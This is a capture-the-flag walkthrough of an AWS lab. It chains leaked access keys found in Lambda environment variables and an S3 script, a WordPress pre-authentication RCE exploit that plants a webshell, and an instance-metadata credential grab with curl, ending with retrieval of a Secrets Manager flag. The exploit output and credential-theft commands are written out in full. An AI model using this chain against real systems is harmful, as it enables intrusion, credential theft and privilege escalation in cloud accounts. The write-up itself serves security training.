# Second Hacksmarter AWS Lab

<img width="800" height="456" alt="5ab710bf-b323-4a19-9d19-dc853e641801" src="https://github.com/user-attachments/assets/4634ff55-4595-44e7-8e07-aea8dd83c68c" />


```jsx
After launching the lab, you will be provided with an AWS Access Key ID and Secret Access Key. These credentials serve as your starting point for accessing and interacting with the AWS environment. No VPN connection is required to complete the lab.

The purpose of this lab is to use the provided AWS credentials to enumerate and assess the AWS environment using tools such as the AWS CLI and Pacu.

Please note that the AWS labs are relatively new. While deployments are generally reliable, there is a small possibility that an issue may occur during provisioning. If you encounter any problems accessing or using the lab environment, you should contact the lab administrator at tyler@kairos-sec.com.
```

<img width="800" height="456" alt="image" src="https://github.com/user-attachments/assets/0b649cfc-2242-4653-b4d7-ee4cc2d71caa" />

## Lab access

To interact with AWS services, you must have at least an IAM account. For this lab, the required AWS access keys are provided, allowing us to authenticate and access the lab environment without creating our own AWS account.

```jsx
access_key: $ACCESS_KEY
secret_key: $SECRET_KEY
```

In this exercise, I will use the built-in AWS CLI and Pacu to work with the provided AWS credentials. Pacu is an AWS exploitation framework developed by Rhino Security Labs. To import these access keys, we will use the following AWS CLI command:

```jsx
aws configure --profile second 

```

## Import the keys to AWS

The first step is to import the provided AWS Access Key ID and Secret Access Key into the AWS CLI. This allows us to authenticate with the lab environment and perform enumeration and assessment activities using the assigned IAM credentials

<img width="800" height="160" alt="image (1)" src="https://github.com/user-attachments/assets/1f167033-00df-41b6-8e26-735a55becb5e" />


Verify the Current AWS Identity

After importing the AWS access keys, the next step is to verify the identity associated with the credentials. This confirms that the authentication was successful and identifies the AWS account and IAM user or role currently in use by executing the equivalent of a "whoami" check.

```html
aws sts get-caller-identity --profile second 
```

<img width="800" height="250" alt="image (2)" src="https://github.com/user-attachments/assets/8482f008-2c99-4744-98c1-6de6ecd5f57b" />


## Pacu version

Before proceeding with the assessment, verify that Pacu is installed correctly and check the version being used. Confirming the tool version helps ensure compatibility with the lab environment and allows you to reference the exact release used during the assessment.

<img width="800" height="156" alt="image (3)" src="https://github.com/user-attachments/assets/a362934b-014b-4065-b44a-09dcc7d17a8f" />


The next step is to import the AWS credentials into Pacu using the AWS CLI profile named `second`. This profile will be used by Pacu to authenticate and interact with the lab's AWS environment during the assessment.

<img width="645" height="144" alt="image (4)" src="https://github.com/user-attachments/assets/a85ca4ac-4fc1-480a-9c75-43919ec3a8e2" />

## Enumerating the Current Access Keys' Permissions

After importing the credentials, the next step is to enumerate the permissions associated with the current AWS access keys. This process helps identify the actions and AWS services that the IAM user or role is authorized to access, providing a clear understanding of the privileges available within the lab environment.

### Profile Name `second`

<img width="800" height="480" alt="image (5)" src="https://github.com/user-attachments/assets/7bcdd51b-0130-47c3-9a57-a538a02a3dab" />


#### My permissions

The current IAM permissions allow me to list AWS Lambda functions. The next step is to enumerate the available Lambda functions in the lab environment and examine their configuration and contents to identify any useful information or potential attack paths.

```jsx
Pacu (hoho:imported-second) > run iam__bruteforce_permissions
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
2026-07-30 13:49:35,063 - 5893 - [INFO] Starting permission enumeration for access-key-id $access-key-id
2026-07-30 13:49:37,172 - 5893 - [INFO] -- Account ARN : arn:aws:iam::946925698533:user/cg-pentest-lab
2026-07-30 13:49:37,172 - 5893 - [INFO] -- Account Id  : 946925698533
2026-07-30 13:49:37,172 - 5893 - [INFO] -- Account Path: user/cg-pentest-lab
2026-07-30 13:49:37,525 - 5893 - [INFO] Attempting common-service describe / list brute force.
2026-07-30 13:49:39,983 - 5893 - [INFO] -- dynamodb.describe_endpoints() worked!
2026-07-30 13:49:47,325 - 5893 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2026-07-30 13:49:49,853 - 5893 - [INFO] -- lambda.list_functions() worked!
2026-07-30 13:49:50,569 - 5893 - [INFO] -- lambda.list_functions() worked!
2026-07-30 13:49:50,950 - 5893 - [INFO] -- sts.get_caller_identity() worked!
2026-07-30 13:49:51,089 - 5893 - [INFO] -- sts.get_session_token() worked!
```

#### Access Keys Found in the Lambda Function

During the enumeration of the AWS Lambda function, AWS access keys were discovered within its configuration. These credentials may belong to another IAM identity and could potentially provide additional permissions within the lab environment. The next step is to validate the credentials and determine the level of access they grant.

```jsx
Pacu (hoho:imported-second) > aws lambda list-functions --region us-east-1
{
    "Functions": [
        {
            "FunctionName": "cg-log-processor-lab",
            "FunctionArn": "arn:aws:lambda:us-east-1:946925698533:function:cg-log-processor-lab",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::946925698533:role/cg-lambda-role-lab",
            "Handler": "lambda.handler",
            "CodeSize": 249,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2026-07-30T12:19:37.868+0000",
            "CodeSha256": "gpAzQITfdhKnlKeb7wY78NGp0K/rTWw9u06xtnB3ZtI=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    **"LAMBDA_MANAGER_AK": $LAMBDA_MANAGER_AK,
                    "LAMBDA_MANAGER_SK": $LAMBDA_MANAGER_SK**
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "ff0ee619-68cb-48c2-89f0-0fd2ddcfa5e3",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}

/// using pacu commands 

Pacu (hoho:imported-second) > run lambda__enum
  Running module lambda__enum...
[lambda__enum] Starting region us-east-1...
[lambda__enum] Access Denied for get-account-settings
[lambda__enum]   Enumerating data for cg-log-processor-lab
[lambda__enum]   FAILURE:
[lambda__enum]     MISSING NEEDED PERMISSIONS
[lambda__enum]   FAILURE:
[lambda__enum]     MISSING NEEDED PERMISSIONS
[lambda__enum]   FAILURE:
[lambda__enum]     MISSING NEEDED PERMISSIONS
[lambda__enum]   FAILURE:
[lambda__enum]     MISSING NEEDED PERMISSIONS
	[+] Secret (ENV): LAMBDA_MANAGER_AK= $LAMBDA_MANAGER_AK
	[+] Secret (ENV): LAMBDA_MANAGER_SK= $LAMBDA_MANAGER_SK
[lambda__enum] lambda__enum completed.

[lambda__enum] MODULE SUMMARY:

  1 functions found in us-east-1. View more information in the DB 
```

### Profile Name `lam`

To enumerate the permissions associated with the newly discovered access keys, I will create a new AWS CLI profile named `lam`. This profile will be used to authenticate with the discovered credentials and assess the level of access they provide within the AWS environment.

#### **Discovering an Amazon S3 Bucket.**

During the enumeration process, an Amazon S3 bucket was identified using the permissions granted by the current credentials. The next step is to inspect the bucket's contents and determine whether it contains sensitive information, configuration files, or other resources that may be useful for further assessment.

```jsx
Pacu (hoho:imported-lam) > run iam__bruteforce_permissions
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
2026-07-30 14:12:49,108 - 5893 - [INFO] Starting permission enumeration for access-key-id $access-key-id
2026-07-30 14:12:50,095 - 5893 - [INFO] -- Account ARN : arn:aws:iam::946925698533:user/cg-lambda-manager-lab
2026-07-30 14:12:50,095 - 5893 - [INFO] -- Account Id  : 946925698533
2026-07-30 14:12:50,095 - 5893 - [INFO] -- Account Path: user/cg-lambda-manager-lab
2026-07-30 14:12:50,340 - 5893 - [INFO] Attempting common-service describe / list brute force.
2026-07-30 14:12:53,227 - 5893 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2026-07-30 14:12:55,037 - 5893 - [INFO] -- s3.list_buckets() worked!
2026-07-30 14:13:01,060 - 5893 - [INFO] -- sts.get_caller_identity() worked!
2026-07-30 14:13:01,181 - 5893 - [INFO] -- sts.get_session_token() worked
2026-07-30 14:13:12,220 - 5893 - [INFO] -- dynamodb.describe_endpoints() worked
```

#### Enumerating the Amazon S3 Bucket

An Amazon S3 bucket named `cg-engineering-scripts-lab-946925698533` was discovered during the enumeration process. The next step is to inspect its contents to identify any files, scripts, or sensitive information that may be useful for further analysis within the lab environment.

<img width="745" height="150" alt="image (6)" src="https://github.com/user-attachments/assets/bcbfd42e-eb90-4878-81b3-0a8c3b843644" />


After identifying the S3 bucket, the next step is to list all of its contents. Enumerating the files and directories stored in the bucket helps identify scripts, configuration files, credentials, or other artifacts that may provide valuable information for further assessment.

```jsx
Pacu (hoho:imported-lam) > aws s3 ls s3://cg-engineering-scripts-lab-946925698533
2026-07-30 13:19:30        316 deployment-script.sh

```

#### Credentials Found in `deployment-script.sh`

During the enumeration of the S3 bucket, I discovered a script named `deployment-script.sh`. I copied the script to my working directory for further analysis and identified a new set of AWS access keys embedded within its contents.

These newly discovered credentials may belong to another IAM identity and could provide additional permissions within the lab environment. The next step is to validate and enumerate the access granted by these keys.

```jsx
Pacu (hoho:imported-lam) > aws s3 cp s3://cg-engineering-scripts-lab-946925698533/deployment-script.sh .

**┌─[donmed@parrot]─[~/AWS/second/pacu]─[192.168.100.131]
└──╼ $ cat deployment-script.sh 
#!/bin/bash
# WordPress Deployment and Backup Automation Script
# Authorized access only.

export AWS__ID= $AWS__ID
export AWS_SECRET_ACCESS_KEY= $AWS_SECRET_ACCESS_KEY

echo "Starting WordPress backup job..."
# Backup tasks go here...
echo "Backup completed successfully."**

```

### Profile Name `bit`

The newly discovered AWS access keys were imported into a new AWS CLI profile named `bit`. Creating a separate profile allows me to authenticate with these credentials independently and enumerate the permissions and resources accessible to this IAM identity.

```jsx
┌─[donmed@parrot]─[~/AWS/second/pacu]─[192.168.100.131]
└──╼ $ aws configure --profile bit
AWS Access Key ID [None]: $AWS_Access_Key_ID
AWS Secret Access Key [None]: $AWS_Secret_Access_Key 
Default region name [None]: us-east-1
Default output format [None]: json
```

After importing the newly discovered AWS access keys into the `bit` profile, the next step is to enumerate the permissions and resources associated with these credentials using Pacu. 

#### My permissions

The current IAM identity has permission to list Amazon EC2 instances. The next step is to enumerate the available EC2 resources and examine their configuration to identify any valuable information or potential opportunities for further assessment within the lab environment.

```jsx
Pacu (hoho:imported-lam) > import_keys bit
  Imported keys as "imported-bit"
Pacu (hoho:imported-bit) > run iam__bruteforce_permissions
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
2026-07-30 14:34:22,409 - 5893 - [INFO] Starting permission enumeration for access-key-id $access-key-id
2026-07-30 14:34:23,073 - 5893 - [INFO] -- Account ARN : arn:aws:iam::946925698533:user/cg-wp-manager-lab
2026-07-30 14:34:23,073 - 5893 - [INFO] -- Account Id  : 946925698533
2026-07-30 14:34:23,073 - 5893 - [INFO] -- Account Path: user/cg-wp-manager-lab
2026-07-30 14:34:23,202 - 5893 - [INFO] Attempting common-service describe / list brute force.
2026-07-30 14:34:25,440 - 5893 - [INFO] -- ec2.describe_instances() worked!
2026-07-30 14:34:25,909 - 5893 - [INFO] -- ec2.describe_tags() worked!
2026-07-30 14:34:29,732 - 5893 - [INFO] -- dynamodb.describe_endpoints() worked!
2026-07-30 14:34:35,545 - 5893 - [INFO] -- sts.get_session_token() worked!
2026-07-30 14:34:35,669 - 5893 - [INFO] -- sts.get_caller_identity() worked!
2026-07-30 14:34:36,354 - 5893 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action

```

#### Found EC2 Instances with a Public IP Address

During the enumeration process, two Amazon EC2 instances were discovered. One of the instances is associated with a public IP address, indicating that it may be accessible over the internet and warrants further investigation as part of the assessment.

```jsx
Pacu (hoho:imported-bit) > set_regions us-east-1
  Session regions changed: ['us-east-1']
Pacu (hoho:imported-bit) > run ec2__enum
  Running module ec2__enum...
[ec2__enum] MODULE SUMMARY:

  Regions:
     us-east-1

    2 total instance(s) found.
    0 total security group(s) found.
    0 total elastic IP address(es) found.
    1 total public IP address(es) found.
    0 total VPN customer gateway(s) found.
    0 total dedicated hosts(s) found.
    0 total network ACL(s) found.
    0 total NAT gateway(s) found.
    0 total network interface(s) found.
    0 total route table(s) found.
    0 total subnets(s) found.
    0 total VPC(s) found.
    0 total VPC endpoint(s) found.
    0 total launch template(s) found.

Pacu (hoho:imported-bit) > data

Session data:
aws_keys: [
    <AWSKey: imported-second>
    <AWSKey: imported-lam>
    <AWSKey: imported-bit>
]
id: 1
created: "2026-07-30 12:38:56.534323"
is_active: true
name: "hoho"
boto_user_agent: "Boto3/1.5.8 Python/3.6.3 Windows/10 Botocore/1.8.22"
key_alias: "imported-bit"
access_key_id: $access_key_id
secret_access_key: "******" (Censored)
session_regions: [
    "us-east-1"
]
EC2: {
    "Instances": [
        {
            "ImageId": "ami-0c71fa2575be40862",
            "InstanceId": "i-00d10038f5dad9c6b",
            "InstanceType": "t3.medium",
            "KeyName": "cg-ec2-key-pair-lab",
            "LaunchTime": "Thu, 30 Jul 2026 12:19:37",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "us-east-1a",
                "Tenancy": "default"
            },
            "State": {
                "Code": 48,
                "Name": "terminated"
            },
            "StateTransitionReason": "User initiated (2026-07-30 13:22:51 GMT)",
            "Architecture": "x86_64",
            "ClientToken": "terraform-iPP5TjqLdT70EgkxEmwEFpeJxA",
            "EnaSupport": true,
            "Hypervisor": "xen",
            "RootDeviceName": "/dev/sda1",
            "RootDeviceType": "ebs",
            "StateReason": {
                "Code": "Client.UserInitiatedShutdown",
                "Message": "Client.UserInitiatedShutdown: User initiated shutdown"
            },
            "VirtualizationType": "hvm",
            "CpuOptions": {
                "CoreCount": 1,
                "ThreadsPerCore": 2
            },
            "CapacityReservationSpecification": {
                "CapacityReservationPreference": "open"
            },
            "MetadataOptions": {
                "State": "pending",
                "HttpTokens": "optional",
                "HttpPutResponseHopLimit": 2,
                "HttpEndpoint": "enabled",
                "HttpProtocolIpv6": "disabled",
                "InstanceMetadataTags": "disabled"
            },
            "BootMode": "uefi-preferred",
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "UsageOperationUpdateTime": "Thu, 30 Jul 2026 12:19:37",
            "MaintenanceOptions": {
                "AutoRecovery": "default"
            },
            "CurrentInstanceBootMode": "uefi",
            "Region": "us-east-1"
        },
        {
            "ImageId": "ami-0c71fa2575be40862",
            "InstanceId": "i-02e50f57d21a0bd11",
            "InstanceType": "t3.medium",
            "KeyName": "cg-ec2-key-pair-lab",
            "LaunchTime": "Thu, 30 Jul 2026 13:29:33",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "us-east-1a",
                "Tenancy": "default"
            },
            "PrivateDnsName": "ip-10-10-10-68.ec2.internal",
            "PrivateIpAddress": "10.10.10.68",
            "PublicDnsName": "ec2-44-198-177-121.compute-1.amazonaws.com",
            "PublicIpAddress": "44.198.177.121",
            "State": {
                "Code": 16,
                "Name": "running"
            },
            "SubnetId": "subnet-0a230c582afdc6d03",
            "VpcId": "vpc-0a9729b6cb694d2e6",
            "Architecture": "x86_64",
            "BlockDeviceMappings": [
                {
                    "DeviceName": "/dev/sda1",
                    "Ebs": {
                        "AttachTime": "Thu, 30 Jul 2026 13:29:34",
                        "DeleteOnTermination": true,
                        "Status": "attached",
                        "VolumeId": "vol-0847b3d2c0845cee3"
                    }
                }
            ],
            "ClientToken": "terraform-sSUotPDmWl7azjp8qCEiSwWqZw",
            "EnaSupport": true,
            "Hypervisor": "xen",
            "IamInstanceProfile": {
                "Arn": "arn:aws:iam::946925698533:instance-profile/cg-ec2-instance-profile-lab",
                "Id": "AIPA5Y6JLPXSWLO7ZLAWA"
            },
            "NetworkInterfaces": [
                {
                    "Association": {
                        "IpOwnerId": "amazon",
                        "PublicDnsName": "ec2-44-198-177-121.compute-1.amazonaws.com",
                        "PublicIp": "44.198.177.121"
                    },
                    "Attachment": {
                        "AttachTime": "Thu, 30 Jul 2026 13:29:33",
                        "AttachmentId": "eni-attach-0bdee91c9d6eb7dfe",
                        "DeleteOnTermination": true,
                        "Status": "attached"
                    },
                    "Groups": [
                        {
                            "GroupName": "cg-ec2-sg-lab",
                            "GroupId": "sg-0fa6ebbff52372b68"
                        }
                    ],
                    "MacAddress": "02:82:80:d6:67:19",
                    "NetworkInterfaceId": "eni-0d495cc59323d2e31",
                    "OwnerId": "946925698533",
                    "PrivateDnsName": "ip-10-10-10-68.ec2.internal",
                    "PrivateIpAddress": "10.10.10.68",
                    "PrivateIpAddresses": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-44-198-177-121.compute-1.amazonaws.com",
                                "PublicIp": "44.198.177.121"
                            },
                            "Primary": true,
                            "PrivateDnsName": "ip-10-10-10-68.ec2.internal",
                            "PrivateIpAddress": "10.10.10.68"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Status": "in-use",
                    "SubnetId": "subnet-0a230c582afdc6d03",
                    "VpcId": "vpc-0a9729b6cb694d2e6",
                    "InterfaceType": "interface"
                }
            ],
            "RootDeviceName": "/dev/sda1",
            "RootDeviceType": "ebs",
            "SecurityGroups": [
                {
                    "GroupName": "cg-ec2-sg-lab",
                    "GroupId": "sg-0fa6ebbff52372b68"
                }
            ],
            "SourceDestCheck": true,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "cg-marketing-wp-lab"
                }
            ],
            "VirtualizationType": "hvm",
            "CpuOptions": {
                "CoreCount": 1,
                "ThreadsPerCore": 2
            },
            "CapacityReservationSpecification": {
                "CapacityReservationPreference": "open"
            },
            "MetadataOptions": {
                "State": "applied",
                "HttpTokens": "optional",
                "HttpPutResponseHopLimit": 2,
                "HttpEndpoint": "enabled",
                "HttpProtocolIpv6": "disabled",
                "InstanceMetadataTags": "disabled"
            },
            "BootMode": "uefi-preferred",
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "UsageOperationUpdateTime": "Thu, 30 Jul 2026 13:29:33",
            "PrivateDnsNameOptions": {
                "HostnameType": "ip-name"
            },
            "MaintenanceOptions": {
                "AutoRecovery": "default"
            },
            "CurrentInstanceBootMode": "uefi",
            "Region": "us-east-1"
        }
    ],
    "PublicIPs": [
        "44.198.177.121"
    ]

```

#### Enumerating the Public IP Address

The next step is to enumerate the public IP address of the EC2 instance by performing a port scan using Nmap. This helps identify the network services exposed by the instance and provides a better understanding of its attack surface.

The Nmap scan revealed that two ports are open on the target instance. These open ports will be examined further to determine the services running on them and their potential significance within the lab environment.

```jsx
┌─[donmed@parrot]─[~/AWS/second/pacu]─[192.168.100.131]
└──╼ $ nmap 44.198.177.121
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-30 14:39 +01
Nmap scan report for ec2-44-198-177-121.compute-1.amazonaws.com (44.198.177.121)
Host is up (0.13s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.16 seconds

```

#### Enumerating the HTTP Service

The next step is to enumerate the HTTP service by visiting the EC2 instance in a web browser using either its public DNS name, `ec2-44-198-177-121.compute-1.amazonaws.com`, or its public IP address, `44.198.177.121`.

Upon inspection, the web application was identified as a WordPress content management system (CMS). Identifying the underlying CMS is valuable, as it may reveal additional enumeration opportunities, such as installed plugins, themes, version information, and potential misconfigurations that can be assessed during the lab.

<img width="800" height="456" alt="image (7)" src="https://github.com/user-attachments/assets/b0bd55dd-889e-46af-afdb-83bc83105549" />

#### Identifying the WordPress Version

The next step is to determine the version of the WordPress installation running on the target EC2 instance.

#### WordPress Version 6.9

The target was identified as running WordPress version `6.9`. Based on the lab information and vulnerability research, this version is reported to be vulnerable to `wp2shell`, a pre-authentication remote code execution (RCE) chain in WordPress Core that comprises **CVE-2026-63030** and **CVE-2026-60137**.

According to the vulnerability description, successful exploitation could allow an unauthenticated attacker to gain complete control of a default WordPress installation without requiring any plugins or user interaction. This makes the vulnerability particularly severe and an important finding during the assessment.

The next step is to verify whether the target is susceptible to this vulnerability within the scope of the lab environment.

<img width="800" height="456" alt="image (8)" src="https://github.com/user-attachments/assets/7f05eefe-562a-43f2-9ac4-414be79ccc44" />

#### Exploiting the Vulnerable WordPress Instance

To exploit the vulnerable WordPress instance, I used a publicly available proof-of-concept (PoC) script designed for the `wp2shell` vulnerability chain. After executing the exploit against the target, I successfully obtained a shell on the EC2 instance.

Gaining shell access confirmed that the target was vulnerable and provided an opportunity to perform further enumeration of the underlying operating system and its resources within the scope of the lab environment.

```jsx
┌─[donmed@parrot]─[~/AWS/second/pacu/wp2shell-poc]─[192.168.100.131]
└──╼ $ python3 wp2shell.py shell http://44.198.177.121/ -i
[!] This uploads a plugin containing a webshell to the target.
[!] No credentials supplied; attempting pre-auth administrator creation.
[*] Creating administrator through the SQLi-to-customizer bridge...
[+] Administrator created: wp2_cf7aceb8db3e
[+]     email:    wp2_cf7aceb8db3e@wp2shell.invalid
[+]     password: Wp2!N23cR7ax4-8dEbDZE7-l
[*] Authenticating as 'wp2_cf7aceb8db3e'...
[+] Authenticated.
[*] Deploying webshell plugin...
[+] Webshell: http://44.198.177.121/wp-content/plugins/wp2shell_9773154d/wp2shell_9773154d.php
[*] Interactive shell — type commands, 'exit' or Ctrl-D to quit.
/var/www/html/wp-content/plugins/wp2shell_9773154d $ 
```

#### Instance Security Credentials Discovered

After obtaining shell access to the EC2 instance, I performed local enumeration to identify any sensitive files or credentials stored on the system. No AWS access keys or other useful credentials were found on the filesystem.

However, I discovered that the EC2 instance was configured with instance security credentials through an attached IAM role. These temporary credentials are provided by the AWS Instance Metadata Service (IMDS) and may grant the instance permission to access additional AWS resources.

```jsx
/var/www/html/wp-content/plugins/wp2shell_7686c758 $ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
cg-ec2-role-lab
/var/www/html/wp-content/plugins/wp2shell_7686c758 $ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-lab
{
  "Code" : "Success",
  "LastUpdated" : "2026-07-30T14:20:01Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : $AccessKeyId,
  "SecretAccessKey" : $SecretAccessKey,
  "Token" : "IQoJb3JpZ2luX2VjEM///////////wEaCXVzLWVhc3QtMSJHMEUCIAFtZvoUdyU/WyKUlIcAkJqP4fSdzgf3XeHJJ29Wspi6AiEA7dvJADCJ8fhd5223eSKfg0kJJiPZ3GTtXgsXvXZvLJgqwwUIl///////////ARAAGgw5NDY5MjU2OTg1MzMiDF0FE5CrLHqRu75m0SqXBcMZF/oshM7xZGXDOXcNxAulLo6bSualk0j7uVaBDtAzKn28q+2MfYjYG/FXe9d6lbqMv72yOpyp3/SbMo3arMjScxvWByoBNY+VDNedR1YOHIisKsqwRgb7GVX+FM5lddYjYB0vmcb69IdgMY1E6nM2xUkm0yLSyVGGvjbfSE+0Am0zLGgy9iFlyoqArpHnY5gjgVwtTnFfL6XpvskdNn3T4yRvImbOLpctYSxI6pkNkcAn2OcZfqqt9awJQ8pK3ftIf/K2ZP8S1Axc/zuPjKe78TVls9OxUPy6Q0KLFO3cYhU/HCe2Qu/L8oAljn8WcIP8QhiH65akCOqB0LRq9F585iKGIDmKxylJh1dq9sHMrF7xRVXQeKtHPDDCfWWzDFHeZp/Rv+7rANINqa+ZpIinQVEOCdBl8AjUYqZU3AB1hEowCzAamvHrdu+5lqRFVekO/+sZHEz5t2t3nns3H30kYQ0Xx6Pf7xxNUOJeHxKWnizY6rSgQ9dtACRIeVMXtnWj3eAm0GiPle9uit3+R/y1PpE5wXrFad3rzZ6chqsWWHYC5WCetvMGh5gq2SILHEDyUqHieDjjoTEQSJ403xA638LSLm+CzcPYDNPWGrEGcBnZXpTaOM4Hp1qR5i5a+G1WqQYAzTwvt1D5HHZCkeRADcurcRg2DtMf042zwXGQXaiR+nQtfnwCwLt761rs8OVwVMC1yxVtGEdeYfTJGfSQfNzPdfy+ExCaAueROdpGQwnn8UW7sVcNfTyajbWov2VwpN0wfjXOLl2E9fNZ8NhdinFLm0mwDzGjZY9zbDs2tL3U408WXUKu2VXUhz2G2Zko5uLSBpuHG7Hs4u5tc0MeZPBM9ocIEpCv/wNC4zXVxI09nal/kDDvuq3TBjqxAWIaAZ0Km7AmBtGpsW7+Y5sGJh27do+yT1VYZHW86xCtiQ/Q8rEOAzm240zaEYF60KJCQWGfIwVkq+w0oksTWpcq+v5vh+DCQSJx+6tedJQpPWVuWrcDnd2R30pjRbq6htsU0JSZtHA6VE+F63qibBRNOssGBrqMySw95DsHcQ0MxpAvLoWfyVmzN+RQbqGcC5uwO1kxoGfPFJrkWdCKncjV4g0ap5OOx/Fo88aW/XasEQ==",
  "Expiration" : "2026-07-30T20:42:22Z"
}

```

### Profile Name: `volvo`

The instance security credentials were imported into a new AWS CLI profile named `volvo`. Using a separate profile allows the newly discovered credentials to be authenticated and enumerated independently from the previously identified IAM identities.

#### My Permissions

After importing the credentials, I enumerated the permissions associated with the `volvo` profile. This process helps determine which AWS services and actions are accessible and may reveal additional resources or privilege escalation opportunities within the lab environment.

```jsx
Pacu (hoho:imported-volvo) > run iam__bruteforce_permissions
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
2026-07-30 16:12:32,364 - 5893 - [INFO] Starting permission enumeration for access-key-id "ASIAYR35WUFD5TKI42YL"
2026-07-30 16:12:33,046 - 5893 - [INFO] -- Account ARN : arn:aws:sts::588137275719:assumed-role/cg-ec2-role-lab/i-0779d05a552e87fc5
2026-07-30 16:12:33,046 - 5893 - [INFO] -- Account Id  : 588137275719
2026-07-30 16:12:33,047 - 5893 - [INFO] -- Account Path: assumed-role/cg-ec2-role-lab/i-0779d05a552e87fc5
2026-07-30 16:12:34,109 - 5893 - [INFO] Attempting common-service describe / list brute force.

[2026-07-30 15:12:34] Pacu encountered an error while running the previous command. Check /home/donmed/.local/share/pacu/hoho/error_log.txt for technical details, or use the debug command. [LOG LEVEL: MINIMAL]

    <class 'OSError'>: [Errno 24] Too many open files: '/home/donmed/.local/share/pacu/hoho/cmd_log.txt'

```

#### Secrets Discovered

The current IAM permissions allow access to AWS Secrets Manager. The next step is to enumerate the available secrets stored within the AWS environment to identify any credentials, configuration values, or sensitive information that may be useful for further assessment.

Listing the secrets in AWS Secrets Manager provides insight into how sensitive data is managed and may reveal additional access paths within the lab environment.

```jsx
┌─[donmed@parrot]─[~/AWS/second/pacu]─[10.240.64.126]
└──╼ $ aws secretsmanager list-secrets --region us-east-1
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:588137275719:secret:cg-final-flag-lab-eNxDLX",
            "Name": "cg-final-flag-lab",
            "Description": "CloudGoat Final Flag",
            "LastChangedDate": "2026-07-30T15:30:38.984000+01:00",
            "LastAccessedDate": "2026-07-30T01:00:00+01:00",
            "SecretVersionsToStages": {
                "terraform-QZdNUk9ojvJRzyFkHRbDiCSNxR": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-07-30T15:30:38.779000+01:00"
        }
    ]
}

```

#### Found the Flag

During the enumeration of AWS Secrets Manager, I discovered a secret named `cg-final-flag-lab`. Based on its name, it is highly likely that this secret contains the final flag for the lab. The next step is to retrieve and inspect the secret's value to confirm its contents and complete the assessment.

```jsx
┌─[donmed@parrot]─[~/AWS/second/pacu]─[10.240.64.126]
└──╼ $ aws secretsmanager get-secret-value --secret-id cg-final-flag-lab --region us-east-1
{
    "ARN": "arn:aws:secretsmanager:us-east-1:588137275719:secret:cg-final-flag-lab-eNxDLX",
    "Name": "cg-final-flag-lab",
    "VersionId": "terraform-QZdNUk9ojvJRzyFkHRbDiCSNxR",
    "SecretString": "~~HSM{369817da90b4cc1ccf592d3fd1}~~", // Look for it yourself, the lab is free
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2026-07-30T15:30:38.979000+01:00"
}

```

#### Retrieved the Flag

After retrieving the value of the `cg-final-flag-lab` secret from AWS Secrets Manager, I confirmed that it contains the final flag for the lab. Successfully accessing the secret marks the completion of the assessment and demonstrates the full attack path, from the initial AWS access keys to the discovery of privileged credentials and sensitive data stored within the AWS environment.

```json
"SecretString": "~~HSM{369817da90b4cc1ccf592d3fd1}~~", // Look for it yourself, the lab is free
```<img width="1600" height="912" alt="5ab710bf-b323-4a19-9d19-dc853e641801" src="https://github.com/user-attachments/assets/001df20b-21a9-4aa5-b91d-01dcca227c33" />
